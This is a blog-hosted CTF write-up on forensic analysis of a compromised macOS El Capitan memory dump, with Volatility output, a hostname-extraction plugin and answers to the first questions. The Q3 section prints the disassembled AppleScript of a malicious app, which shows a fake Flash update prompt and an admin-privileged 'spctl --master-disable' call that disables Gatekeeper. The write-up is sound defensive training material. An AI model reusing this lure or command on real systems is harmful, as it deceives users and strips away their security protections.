<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    










    







<script defer language="javascript" type="text/javascript" src="/js/bundle.min.145453261a7755f5042a854c4213501d215a8fbe34c08d181c40f803f1315e74.js"></script>






    
    <meta http-equiv="content-type" content="text/html; charset=utf-8">

    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    
    <link rel="icon" href=/favicon.png>

    
    





  





  
  
  


<!-- Open Graph image and Twitter Card metadata -->

<title itemprop="name">gh0stkn1gh7 - S4nct1m0ny bi0s CTF 2025 Writeup</title>
<meta property="og:title" content=gh0stkn1gh7&#32;-&#32;S4nct1m0ny&#32;bi0s&#32;CTF&#32;2025&#32;Writeup />
<meta name="twitter:title" content=gh0stkn1gh7&#32;-&#32;S4nct1m0ny&#32;bi0s&#32;CTF&#32;2025&#32;Writeup />
<meta itemprop="name" content=gh0stkn1gh7&#32;-&#32;S4nct1m0ny&#32;bi0s&#32;CTF&#32;2025&#32;Writeup />
<meta name="application-name" content=gh0stkn1gh7&#32;-&#32;S4nct1m0ny&#32;bi0s&#32;CTF&#32;2025&#32;Writeup />
<meta property="og:site_name" content="gh0stkn1gh7" />


<meta name="description" content="" />
<meta itemprop="description" content="" />
<meta property="og:description" content="" />
<meta name="twitter:description" content="" />


<base href="//localhost:1313/posts/s4nct1m0ny/" />
<link rel="canonical" href="//localhost:1313/posts/s4nct1m0ny/" itemprop="url" />
<meta name="url" content="//localhost:1313/posts/s4nct1m0ny/" />
<meta name="twitter:url" content="//localhost:1313/posts/s4nct1m0ny/" />
<meta property="og:url" content="//localhost:1313/posts/s4nct1m0ny/" />


<meta property="og:updated_time" content="2025-10-10T00:00:00Z" />


<link rel="sitemap" type="application/xml" title="Sitemap" href='//localhost:1313/sitemap.xml' />

<meta name="robots" content="index,follow" />
<meta name="googlebot" content="index,follow" />



  
    <meta name="twitter:site" content="@gh0stkn1gh7" />
    <meta name="twitter:creator" content="@gh0stkn1gh7" />

<meta property="fb:admins" content="" />


<meta name="apple-mobile-web-app-title" content="gh0stkn1gh7" />
<meta name="apple-mobile-web-app-capable" content="yes" />
<meta name="apple-mobile-web-app-status-bar-style" content="black" />






<meta name="generator" content="Hugo 0.139.3">


    
    

<link type="text/css" rel="stylesheet" href="/css/bundle.min.89e4e7ff977d0d1857739f9ce7f8c9660eb27064523c8b4a9f79717dc9a6fbdb.css">


    
    <style>
    body {
        --sidebar-bg-color: #202020;
        --sidebar-img-border-color: #515151;
        --sidebar-p-color: #909090;
        --sidebar-h1-color: #FFF;
        --sidebar-a-color: #FFF;
        --sidebar-socials-color: #FFF;
        --text-color: #222;
        --bkg-color: #FAF9F6;
        --post-title-color: #303030;
        --list-color: #5a5a5a;
        --link-color: #268bd2;
        --date-color: #515151;
        --table-border-color: #E5E5E5;
        --table-stripe-color: #F9F9F9;
        --code-color: #000;
        --code-background-color: #E5E5E5;
        --code-block-color: #fff;
        --code-block-background-color: #272822;
        --moon-sun-color: #FFF;
        --moon-sun-background-color: #515151;
    }
    body.dark-theme {
        --text-color: #eee;
        --bkg-color: #121212;
        --post-title-color: #DBE2E9;
        --list-color: #9d9d9d;
        --link-color: #268bd2;
        --date-color: #9a9a9a;
        --table-border-color: #515151;
        --table-stripe-color: #202020;
        --code-color: #fff;
        --code-background-color: #515151;
        --code-block-color: #fff;
        --code-block-background-color: #272822;
    }
    body {
        background-color: var(--bkg-color);
    }
</style>

</head>

    <body class="dark-theme">
        <div class="wrapper">
            <aside class="sidebar">
    <div class="container sidebar-sticky">
        <div class="light-dark" align="right">
    <button class="btn-light-dark" title="Toggle light/dark mode">
        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
        </svg>
        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
        </svg>
    </button>
</div>

        <div class="sidebar-about">
    <h1 class="brand">
        
            <a href="//localhost:1313/">
                <img src="/images/brand_image.gif" alt="brand image">
            </a>
        
        
            <a href="//localhost:1313/">
                <h1>gh0stkn1gh7</h1>
            </a>
        
    </h1>
    <p class="lead">
    DFIR | Malware Analysis | CTFs | Security Research
    </p>
</div>

        <nav>
    <ul class="sidebar-nav">

        
        
        
        
            

            
                
                
            
            
                
                
            
                
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
            
        
        
            

            
                
                
                    <li class="heading">
                        <a href="/posts/">Posts</a>
                    </li>
                    
                        <li class="sub-heading">
                            Recent
                        </li>
                        
                            <li class="bullet">
                                <a href="//localhost:1313/posts/s4nct1m0ny/">S4nct1m0ny bi0s CTF 2025 Writeup</a>
                            </li>
                        
                    
                
            
            
                
                
            
                
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
            
        

    </ul>
</nav>

        
    <a target="_blank" class="social" title="GitHub" href="https://github.com/gh0stkn1gh7">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
        </svg>
    </a>



    <a target="_blank" class="social" title="LinkedIn" href="https://www.linkedin.com/in/gh0stkn1ght/">
        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
        </svg>
    </a>


    <a target="_blank" class="social" title="Twitter" href="https://twitter.com/gh0stkn1gh7">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M5.032 14.286c6.037 0 9.34-4.837 9.34-9.032c0-.137 0-.274-.01-.41A6.56 6.56 0 0 0 16 3.2c-.6.256-1.235.425-1.885.5a3.207 3.207 0 0 0 1.443-1.757c-.645.37-1.35.63-2.085.77a3.322 3.322 0 0 0-1.862-.958a3.384 3.384 0 0 0-2.082.334a3.223 3.223 0 0 0-1.442 1.49a3.08 3.08 0 0 0-.208 2.03a9.57 9.57 0 0 1-3.747-.963a9.269 9.269 0 0 1-3.018-2.354a3.086 3.086 0 0 0-.36 2.314c.189.787.68 1.475 1.376 1.924a3.344 3.344 0 0 1-1.49-.398v.04c0 .734.263 1.444.743 2.01a3.3 3.3 0 0 0 1.89 1.102c-.483.128-.99.146-1.482.055a3.19 3.19 0 0 0 1.168 1.577a3.36 3.36 0 0 0 1.9.627A6.732 6.732 0 0 1 0 12.86a9.527 9.527 0 0 0 5.032 1.423"/>
        </svg>
    </a>






    <a target="_blank" class="social" title="Discord" href="gh0stkn1ght">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24">
            <path fill="currentColor" d="M19.27 5.33C17.94 4.71 16.5 4.26 15 4a.09.09 0 0 0-.07.03c-.18.33-.39.76-.53 1.09a16.09 16.09 0 0 0-4.8 0c-.14-.34-.35-.76-.54-1.09c-.01-.02-.04-.03-.07-.03c-1.5.26-2.93.71-4.27 1.33c-.01 0-.02.01-.03.02c-2.72 4.07-3.47 8.03-3.1 11.95c0 .02.01.04.03.05c1.8 1.32 3.53 2.12 5.24 2.65c.03.01.06 0 .07-.02c.4-.55.76-1.13 1.07-1.74c.02-.04 0-.08-.04-.09c-.57-.22-1.11-.48-1.64-.78c-.04-.02-.04-.08-.01-.11c.11-.08.22-.17.33-.25c.02-.02.05-.02.07-.01c3.44 1.57 7.15 1.57 10.55 0c.02-.01.05-.01.07.01c.11.09.22.17.33.26c.04.03.04.09-.01.11c-.52.31-1.07.56-1.64.78c-.04.01-.05.06-.04.09c.32.61.68 1.19 1.07 1.74c.03.01.06.02.09.01c1.72-.53 3.45-1.33 5.25-2.65c.02-.01.03-.03.03-.05c.44-4.53-.73-8.46-3.1-11.95c-.01-.01-.02-.02-.04-.02zM8.52 14.91c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.84 2.12-1.89 2.12zm6.97 0c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.83 2.12-1.89 2.12z"/>
        </svg>
    </a>










    <a target="_blank" class="social" title="Email" href="mailto:mspreethamreddy75@gmail.com">
       <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 485.211 485.211">
            <path fill="currentColor" d="M301.393,241.631L464.866,424.56H20.332l163.474-182.928l58.801,51.443L301.393,241.631z M462.174,60.651H23.027 l219.579,192.142L462.174,60.651z M324.225,221.67l160.986,180.151V80.792L324.225,221.67z M0,80.792v321.029L160.972,221.64 L0,80.792z"/>
       </svg>
    </a>




        <p class="footnote">
powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
    <br>
    &copy; 2025 gh0stkn1gh7. All rights reserved.
</p>

  </div>
</aside>

            <main class="content container">
                <div class="post">
  <div class="info">
  <h1 class="post-title">
    <a href="//localhost:1313/posts/s4nct1m0ny/">S4nct1m0ny bi0s CTF 2025 Writeup</a>
  </h1>

  <div class="headline">
    <div>
      
      
      <time datetime=" 2025-10-10T00:00:00Z" class="post-date">
        October 10, 2025
      </time>
      
      <span> - </span>
      <span class="reading-time">
        
          
        

        <span>56 mins read</span>
      </span>
    </div>

    
    <ul class="tags">
      
      <li class="tag-CTF">
        <a href="//localhost:1313/tags/ctf">CTF</a>
      </li>
      
      <li class="tag-writeup">
        <a href="//localhost:1313/tags/writeup">writeup</a>
      </li>
      
      <li class="tag-DFIR">
        <a href="//localhost:1313/tags/dfir">DFIR</a>
      </li>
      
      <li class="tag-macOS">
        <a href="//localhost:1313/tags/macos">macOS</a>
      </li>
      
      <li class="tag-Memory-forensics">
        <a href="//localhost:1313/tags/memory-forensics">Memory-forensics</a>
      </li>
      
      <li class="tag-Malware-analysis">
        <a href="//localhost:1313/tags/malware-analysis">Malware-analysis</a>
      </li>
      
    </ul>
    
  </div>

  
  

  
</div>

  <h1 id="s4nct1m0ny">S4nct1m0ny</h1>
<p><img src="images/Amazing-Spider-Man-317-cover.avif" alt="cover-image"></p>
<h3 id="challenge-description">Challenge Description</h3>
<p>Peter Parker, the Daily Bugle’s star photographer and secretly Spider-Man, exposed Eddie Brock’s fake Spider-Man photos, earning J. Jonah Jameson’s praise. When Eddie begged for forgiveness, Peter snapped, “You want forgiveness? Get religion.” Humiliated, Eddie—now bonded with Venom—plotted his revenge. Recently, Peter faced performance issues with his laptop and sent it in for service. Upon its return, he noticed something was off. His Spider-Sense tingled — someone had tampered with it. Help Peter analyse the compromised system</p>
<p><strong>Challenge File</strong>:</p>
<ul>
<li><a href="https://drive.google.com/file/d/1f8wWkLfwaMpSRcq-Gua8hdcmPQcabpOB/view?usp=sharing" target="_blank">Primary Link</a></li>
<li><a href="https://mega.nz/file/5ClWnLAK#MBTjnlzVwAmK3hfNUp2FoB0rE7HHmeLiHdtPhbcnZPY" target="_blank">Mirror Link</a></li>
</ul>
<p><strong>MD5 Hash</strong>:
c962ed1ae53f2003658caa07d47d33eb</p>
<p><strong>Evidence File Password</strong>: <code>TLaf.KdUxFz'So3z</code></p>
<h3 id="writeup">Writeup</h3>
<p>We have been presented with a .raw file whose size is 6.45 GB upon a small peek in the hex editor we can confirm that the given file indeed is a memory dump</p>
<p>Q1/15) What is the OS version of the compromised system?
Format: <em>OS_version_number</em></p>
<p>well, for this we were asked to find the operating system and version the of the compromised system from which the memory dump was acquired, so intially we can do the <code>banners.Banners</code> from volatility 3 :
<img src="images/1.png" alt="banners.Banners output">
ok when u search online for this kernel version u get :
<img src="images/2.png" alt=""></p>
<p><a href="https://en.wikipedia.org/wiki/OS_X_El_Capitan" target="_blank">https://en.wikipedia.org/wiki/OS_X_El_Capitan</a></p>
<p>also when we can use volatility 2 determine the profile, since we already know its a macOS operating system we can the plugin <code>mac_get_profile</code>:</p>
<p><img src="images/3.png" alt="mac_get_profile output">
well from the above we can conclude that the answer to the first question is <code>OS_X_El_Capitan_10.11.6</code> or <code>macOS_El_Capitan_10.11.6</code> as it was rebranded later  moving on to the next question</p>
<p>Q2/15) What is the hostname of the compromised system?
Format: <em>hostname</em></p>
<p>To extract the hostname from the macOS El Capitan memory dump, I developed a custom Volatility 2 plugin. The hostname is a critical piece of information in forensic investigations as it helps identify the specific machine that was compromised. Volatility 2&rsquo;s built-in Mac plugins don&rsquo;t include a hostname extraction tool. However, the macOS kernel stores the system hostname in global variables that persist in memory:</p>
<ul>
<li><code>_hostname</code> - Contains the actual hostname string</li>
<li><code>_hostnamelen</code> - Stores the length of the hostname (32-bit integer)
By leveraging Volatility&rsquo;s symbol resolution capabilities, we can locate these kernel variables directly in the memory dump without needing to search through potentially unreliable process memory or parse file system artifacts.</li>
</ul>
<p>The plugin works through the following steps:</p>
<ol>
<li><strong>Symbol Resolution</strong>: Uses the Volatility profile (specific to macOS 10.11.6) to resolve the kernel symbols <code>_hostname</code> and <code>_hostnamelen</code> to their actual memory addresses</li>
<li><strong>Read Length</strong>: Reads 4 bytes from the <code>_hostnamelen</code> address and unpacks it as a little-endian unsigned integer using <code>struct.unpack('&lt;I', raw_len)[0]</code></li>
<li><strong>Read Hostname</strong>: Using the length value, reads exactly that many bytes from the <code>_hostname</code> address to extract the hostname string</li>
<li><strong>Cleanup</strong>: Removes null terminators and returns the hostname</li>
</ol>
<p>Just add it as <code>mac_get_hostname</code> under <code>volatility\volatility\plugins\mac</code> ,
Here is  the code :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> volatility.commands <span style="color:#66d9ef">as</span> commands
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> volatility.utils <span style="color:#66d9ef">as</span> utils
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">mac_get_hostname</span>(commands<span style="color:#f92672">.</span>Command):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">calculate</span>(self):
</span></span><span style="display:flex;"><span>	    <span style="color:#75715e"># Get kernel address space and profile</span>
</span></span><span style="display:flex;"><span>        kernel_space <span style="color:#f92672">=</span> utils<span style="color:#f92672">.</span>load_as(self<span style="color:#f92672">.</span>_config)
</span></span><span style="display:flex;"><span>        profile <span style="color:#f92672">=</span> kernel_space<span style="color:#f92672">.</span>profile
</span></span><span style="display:flex;"><span>		
</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># Resolve symbols to memory addresses</span>
</span></span><span style="display:flex;"><span>        hostname_sym <span style="color:#f92672">=</span> profile<span style="color:#f92672">.</span>get_symbol(<span style="color:#e6db74">&#34;_hostname&#34;</span>)
</span></span><span style="display:flex;"><span>        hostnamelen_sym <span style="color:#f92672">=</span> profile<span style="color:#f92672">.</span>get_symbol(<span style="color:#e6db74">&#34;_hostnamelen&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> hostname_sym <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">or</span> hostnamelen_sym <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>            print <span style="color:#e6db74">&#34;[!] Could not find _hostname or _hostnamelen symbols&#34;</span>
</span></span><span style="display:flex;"><span>            print <span style="color:#e6db74">&#34;[!] _hostname: </span><span style="color:#e6db74">{0}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(hostname_sym)
</span></span><span style="display:flex;"><span>            print <span style="color:#e6db74">&#34;[!] _hostnamelen: </span><span style="color:#e6db74">{0}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(hostnamelen_sym)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;[*] Found _hostnamelen at: 0x</span><span style="color:#e6db74">{0:x}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(hostnamelen_sym)
</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;[*] Found _hostname at: 0x</span><span style="color:#e6db74">{0:x}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(hostname_sym)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># Read and parse length (4 bytes, little-endian unsigned int)</span>
</span></span><span style="display:flex;"><span>        raw_len <span style="color:#f92672">=</span> kernel_space<span style="color:#f92672">.</span>read(hostnamelen_sym, <span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> raw_len <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">or</span> len(raw_len) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">4</span>:
</span></span><span style="display:flex;"><span>            print <span style="color:#e6db74">&#34;[!] Could not read hostname length&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        hostnamelen <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, raw_len)[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;[*] Hostname length: </span><span style="color:#e6db74">{0}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(hostnamelen)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> hostnamelen <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> hostnamelen <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">256</span>:
</span></span><span style="display:flex;"><span>            print <span style="color:#e6db74">&#34;[!] Invalid hostname length: </span><span style="color:#e6db74">{0}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(hostnamelen)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Read hostname string</span>
</span></span><span style="display:flex;"><span>        raw_hostname <span style="color:#f92672">=</span> kernel_space<span style="color:#f92672">.</span>read(hostname_sym, hostnamelen)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> raw_hostname <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>            print <span style="color:#e6db74">&#34;[!] Could not read hostname string&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        hostname <span style="color:#f92672">=</span> raw_hostname<span style="color:#f92672">.</span>rstrip(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">yield</span> hostname
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">render_text</span>(self, outfd, data):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> hostname <span style="color:#f92672">in</span> data:
</span></span><span style="display:flex;"><span>            outfd<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;Hostname: </span><span style="color:#e6db74">{0}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(hostname))
</span></span></code></pre></div><p>output :</p>
<pre tabindex="0"><code>Volatility Foundation Volatility Framework 2.6.1
[*] Found _hostnamelen at: 0xffffff8015521a30
[*] Found _hostname at: 0xffffff8015521930
[*] Hostname length: 15
Hostname: Mac-Admin.local
</code></pre><p>Therefore the answer to this question is :</p>
<pre tabindex="0"><code>Mac-Admin.local
</code></pre><p>Q3/15) What is the application responsible for the initial infection of the system?</p>
<p>Format: <em>Appname</em></p>
<p>when navigating through the files present by using <code>mac_list_files</code> from volatility 2 ,we can see that there is an app named <code>ImageEnhancePro.app</code> which does look a bit suspicious  as it was found under Downloads :
<img src="images/4.png" alt="file_scan_output">
when we search for this app we can find it on <code>App Store</code>:
<img src="images/5.png" alt="ImageEnhancepro.app">
So upon analysing the applet, for which we  disassembled   the <code>main.scpt</code> under this app
by using <a href="https://github.com/Jinmo/applescript-disassembler" target="_blank">applescript-disassembler</a> , we get the following output:</p>
<pre tabindex="0"><code>=== data offset 2 ===
Function name : &lt;Value type=object value=&lt;Value type=event_identifier value=b&#39;aevt&#39;-b&#39;oapp&#39;-b&#39;null&#39;-b&#39;\x00\x00\x80\x00&#39;-b&#39;****&#39;-b&#39;\x00\x00\x90\x00&#39;&gt;&gt;
Function arguments:  &lt;empty or unknown&gt;
 00000 PushLiteral 0 # [177, &lt;Value type=string value=b&#39;\x00A\x00d\x00o\x00b\x00e\x00 \x00F\x00l\x00a\x00s\x00h\x00 \x00U\x00p\x00d\x00a\x00t\x00e\x00 \x00R\x00e\x00q\x00u\x00i\x00r\x00e\x00d\x00\n\x00\n\x00P\x00l\x00e\x00a\x00s\x00e\x00 \x00i\x00n\x00s\x00t\x00a\x00l\x00l\x00 \x00t\x00h\x00e\x00 \x00l\x00a\x00t\x00e\x00s\x00t\x00 \x00u\x00p\x00d\x00a\x00t\x00e\x00 \x00t\x00o\x00 \x00c\x00o\x00n\x00t\x00i\x00n\x00u\x00e\x00.&#39;&gt;]
 00001 PushLiteral 1 # &lt;Value type=object value=&lt;Value type=constant value=0x62746e73&gt;&gt;
 00002 PushLiteral 2 # [177, &lt;Value type=string value=b&#39;\x00I\x00n\x00s\x00t\x00a\x00l\x00l&#39;&gt;]
 00003 Push1
 00004 MakeVector
 00005 PushLiteral 3 # &lt;Value type=object value=&lt;Value type=constant value=0x64666c74&gt;&gt;
 00006 PushLiteral 4 # [177, &lt;Value type=string value=b&#39;\x00I\x00n\x00s\x00t\x00a\x00l\x00l&#39;&gt;]
 00007 PushLiteral 5 # &lt;Value type=object value=&lt;Value type=constant value=0x64697370&gt;&gt;
 00008 PushLiteral 6 # &lt;Value type=object value=&lt;Value type=constant value=0x7374696300000002&gt;&gt;
 00009 PushLiteral 7 # &lt;Value type=fixnum value=0x6&gt;
 0000a MessageSend 8 # &lt;Value type=object value=&lt;Value type=event_identifier value=b&#39;syso&#39;-b&#39;dlog&#39;-b&#39;askr&#39;-b&#39;\x00\x00\x00\x00&#39;-b&#39;TEXT&#39;-b&#39;\x00\x00\x00\x00&#39;&gt;&gt;
 0000d StoreResult
 0000e ErrorHandler 27
     00011 PushLiteral 9 # [177, &lt;Value type=string value=b&#39;\x00s\x00p\x00c\x00t\x00l\x00 \x00-\x00-\x00m\x00a\x00s\x00t\x00e\x00r\x00-\x00d\x00i\x00s\x00a\x00b\x00l\x00e&#39;&gt;]
     00012 PushLiteral 10 # &lt;Value type=object value=&lt;Value type=constant value=0x6261646d&gt;&gt;
     00013 PushTrue &lt;disassembler not implemented&gt;
     00014 Push2
     00015 MessageSend 11 # &lt;Value type=object value=&lt;Value type=event_identifier value=b&#39;syso&#39;-b&#39;exec&#39;-b&#39;TEXT&#39;-b&#39;\xff\xff\x80\x00&#39;-b&#39;TEXT&#39;-b&#39;\x00\x00\x00\x00&#39;&gt;&gt;
     00018 EndErrorHandler 51
 0001b HandleError 12 13
 00020 PushLiteral 14 # [177, &lt;Value type=string value=b&#39;\x00F\x00a\x00i\x00l\x00e\x00d\x00 \x00t\x00o\x00 \x00d\x00i\x00s\x00a\x00b\x00l\x00e\x00 \x00G\x00a\x00t\x00e\x00k\x00e\x00e\x00p\x00e\x00r\x00:\x00 &#39;&gt;]
 00021 PushVariable [var_0]
 00022 Concatenate
 00023 PushLiteral 1 # &lt;Value type=object value=&lt;Value type=constant value=0x62746e73&gt;&gt;
 00024 PushLiteral 15 # [177, &lt;Value type=string value=b&#39;\x00O\x00K&#39;&gt;]
 00025 Push1
 00026 MakeVector
 00027 PushLiteral 3 # &lt;Value type=object value=&lt;Value type=constant value=0x64666c74&gt;&gt;
 00028 PushLiteralExtended 16 # [177, &lt;Value type=string value=b&#39;\x00O\x00K&#39;&gt;]
 0002b PushLiteral 5 # &lt;Value type=object value=&lt;Value type=constant value=0x64697370&gt;&gt;
 0002c PushLiteralExtended 17 # &lt;Value type=object value=&lt;Value type=constant value=0x7374696300000000&gt;&gt;
 0002f PushLiteral 7 # &lt;Value type=fixnum value=0x6&gt;
 00030 MessageSend 8 # &lt;Value type=object value=&lt;Value type=event_identifier value=b&#39;syso&#39;-b&#39;dlog&#39;-b&#39;askr&#39;-b&#39;\x00\x00\x00\x00&#39;-b&#39;TEXT&#39;-b&#39;\x00\x00\x00\x00&#39;&gt;&gt;
 00033 StoreResult
 00034 ErrorHandler 67
